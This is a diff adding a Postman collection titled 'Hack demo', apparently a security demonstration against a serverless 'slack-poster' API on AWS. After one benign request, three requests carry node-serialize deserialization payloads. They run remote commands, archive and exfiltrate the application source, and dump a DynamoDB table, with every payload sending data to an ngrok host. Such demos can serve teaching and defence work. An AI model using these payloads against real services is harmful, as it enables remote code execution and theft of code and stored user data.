@@ -1,0 +1,141 @@
+{
+	"info": {
+		"_postman_id": "6a23ce54-f92c-43fa-895b-d0a6d72500b1",
+		"name": "Hack demo",
+		"description": "Postman Echo is service you can use to test your REST clients and make sample API calls. It provides endpoints for `GET`, `POST`, `PUT`, various auth mechanisms and other utility endpoints.\n\nThe documentation for the endpoints as well as example responses can be found at [https://postman-echo.com](https://postman-echo.com/?source=echo-collection-app-onboarding)",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "Good case",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"text\":\"Hi. I'm a message with good intention\", \"username\":\"mahdi\"}"
+				},
+				"url": {
+					"raw": "https://np3qfrp4gh.execute-api.eu-central-1.amazonaws.com/dev/slack-poster",
+					"protocol": "https",
+					"host": [
+						"np3qfrp4gh",
+						"execute-api",
+						"eu-central-1",
+						"amazonaws",
+						"com"
+					],
+					"path": [
+						"dev",
+						"slack-poster"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Exploit_1",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"text\":\"hello\", \"username\":\"_$$ND_FUNC$$_function(){require(\\\"child_process\\\").exec(\\\"curl http://e70d13b1.ngrok.io\\\",function(error,stdout,stderr){console.log(stdout)});}()\"}"
+				},
+				"url": {
+					"raw": "https://np3qfrp4gh.execute-api.eu-central-1.amazonaws.com/dev/slack-poster",
+					"protocol": "https",
+					"host": [
+						"np3qfrp4gh",
+						"execute-api",
+						"eu-central-1",
+						"amazonaws",
+						"com"
+					],
+					"path": [
+						"dev",
+						"slack-poster"
+					]
+				},
+				"description": "check if API is vulnerable"
+			},
+			"response": []
+		},
+		{
+			"name": "explot_2",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"text\":\"hello\", \"username\":\"_$$ND_FUNC$$_function(){require(\\\"child_process\\\").exec(\\\"tar -pcvzf /tmp/source.tar.gz ./; echo mahdi; b=`base64 --wrap=0 /tmp/source.tar.gz`; curl -X POST http://e70d13b1.ngrok.io --data $b\\\",function(error,stdout,stderr){console.log(stdout)});}()\"}"
+				},
+				"url": {
+					"raw": "https://np3qfrp4gh.execute-api.eu-central-1.amazonaws.com/dev/slack-poster",
+					"protocol": "https",
+					"host": [
+						"np3qfrp4gh",
+						"execute-api",
+						"eu-central-1",
+						"amazonaws",
+						"com"
+					],
+					"path": [
+						"dev",
+						"slack-poster"
+					]
+				},
+				"description": "get source code in base64.\n\nto decode:\n\necho _BASE64_DATA_ | base64 --decode > vitim-source.tar.gz; tar vrfx ./victim-source.tar.gz\n"
+			},
+			"response": []
+		},
+		{
+			"name": "exploit_3",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\"text\":\"hola!\", \"username\":\"_$$ND_FUNC$$_function(){var s=require(\\\"aws-sdk\\\"),h=require(\\\"http\\\"),d=new s.DynamoDB.DocumentClient;d.scan({TableName:process.env.DYNAMODB_TABLE},function(e,a){if(e){}else{var t=Buffer.from(JSON.stringify(a)).toString(\\\"base64\\\");h.get(\\\"http://e70d13b1.ngrok.io?data=\\\"+t,function(e){});}});}()\"}"
+				},
+				"url": {
+					"raw": "https://np3qfrp4gh.execute-api.eu-central-1.amazonaws.com/dev/slack-poster",
+					"protocol": "https",
+					"host": [
+						"np3qfrp4gh",
+						"execute-api",
+						"eu-central-1",
+						"amazonaws",
+						"com"
+					],
+					"path": [
+						"dev",
+						"slack-poster"
+					]
+				},
+				"description": "extract db data"
+			},
+			"response": []
+		}
+	]
+}
